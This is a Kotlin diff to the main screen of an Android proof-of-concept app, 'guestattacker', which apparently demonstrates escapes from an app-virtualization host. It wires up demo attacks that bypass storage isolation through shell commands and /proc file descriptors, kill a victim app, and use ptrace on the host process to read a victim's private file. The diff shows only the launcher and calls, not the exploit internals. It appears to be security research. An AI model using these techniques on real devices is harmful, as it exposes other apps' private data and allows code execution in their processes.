@@ -2,10 +2,7 @@ package com.virtualxposed.guestattacker
 
 import android.annotation.SuppressLint
 import android.app.ActivityManager
-import android.content.Intent
-import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
 import android.os.Bundle
-import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
@@ -17,7 +14,6 @@ import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
 import androidx.compose.ui.Modifier
 import com.virtualxposed.guestattacker.ui.theme.AttacksTheme
-import java.io.File
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Column
 import androidx.compose.foundation.layout.PaddingValues
@@ -36,24 +32,20 @@ import androidx.compose.runtime.remember
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
-import java.io.BufferedReader
-import java.io.InputStreamReader
-import androidx.core.net.toUri
-import com.virtualxposed.guestattacker.StorageBypass.victimApp
+import com.virtualxposed.guestattacker.StorageBypass.HOST_APP
 import com.virtualxposed.guestattacker.StorageBypass.victimFile
-import com.virtualxposed.guestattacker.Utils.executeShellCommand
-import com.virtualxposed.guestattacker.Utils.getOpenFileDescriptors
-import com.virtualxposed.guestattacker.Utils.log
 import com.virtualxposed.guestattacker.Utils.toast
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import kotlin.io.path.absolutePathString
-import kotlin.io.path.readSymbolicLink
-import kotlin.time.Duration.Companion.milliseconds
 
 class MainActivity : ComponentActivity() {
+    companion object {
+        init {
+            System.loadLibrary("guestattacker")
+        }
+    }
+
     @SuppressLint("SdCardPath")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -65,15 +57,15 @@ class MainActivity : ComponentActivity() {
                     listOf(
                         DemoAction(
                             "Shell bypass",
-                            "Read and write private file information via shell commands",
+                            "Read and write victim file information via shell commands. Shell commands can be used to escalate privileges to host",
                             DemoCategory.IO,
                         ) {
                             StorageBypass.shellBypass(this)
                         },
                         DemoAction(
                             "File descriptor bypass",
-                            "Use file descriptors from proc to read and write private data",
-                            DemoCategory.IO,
+                            "Use file descriptors from proc to read and write victim files",
+                            DemoCategory.SharedProcess,
                         ) {
                             StorageBypass.fdBypass(this)
                         },
@@ -86,12 +78,37 @@ class MainActivity : ComponentActivity() {
                         },
                         DemoAction(
                             "Kill apps",
-                            "Interfere with other apps by killing them",
+                            "Interfere with other apps by killing them. This kills the victim app",
                             DemoCategory.Interference,
                         ) {
                             CoroutineScope(Dispatchers.IO).launch {
                                 Interference.killVictim(this@MainActivity)
                             }
+                        },
+
+                        DemoAction(
+                            "ptrace injection",
+                            "Use ptrace to read a victim file as the host process. Can be used to perform arbitrary code execution as the host." +
+                                    "\nThis demo is only programmed to support x86_64",
+                            DemoCategory.SharedProcess,
+                        ) {
+                            val activityManager =
+                                this.getSystemService(ACTIVITY_SERVICE) as ActivityManager
+
+                            val hostApp = activityManager.runningAppProcesses.firstOrNull {
+                                it.processName == HOST_APP
+                            }
+                            if (hostApp == null) {
+                                toast(this, "Failed to find host process.")
+                                return@DemoAction
+                            }
+
+                            val result =
+                                Native.ptraceOpen(hostApp.pid, victimFile.absolutePath, 1000)
+                            toast(
+                                this,
+                                "Private file results: $result",
+                            )
                         },
                         // TODO Find context abuse
                     )
@@ -105,7 +122,8 @@ class MainActivity : ComponentActivity() {
 enum class DemoCategory(val categoryName: String) {
     IO("Improper storage isolation"),
     MissingHook("Missing hook abuse"),
-    Interference("Cross-app interference")
+    Interference("Cross-app interference"),
+    SharedProcess("Shared process vulnerabilities")
 }
 
 data class DemoAction(
